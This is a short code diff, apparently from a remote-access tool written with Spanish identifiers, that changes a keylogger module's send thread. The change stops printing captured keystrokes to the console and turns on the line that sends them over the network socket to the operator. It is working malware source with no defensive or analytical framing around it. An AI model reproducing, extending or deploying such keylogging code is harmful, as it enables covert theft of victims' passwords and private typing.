@@ -495,8 +495,7 @@ void mod_Keylogger::SendThread() {
         std::string strData = Get_Data();
         int iData_Size = strData.size();
         if (iData_Size > 0) {
-            std::cout << strData << "\n";
-            //cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
+            cCliente->cChunkSend(cCliente->sckSocket, strData.c_str(), iData_Size, 0, true, nullptr, EnumComandos::KL_Salida);
             Clear_Data(iData_Size+1); // +1 por el byte nulo \0
         }
         
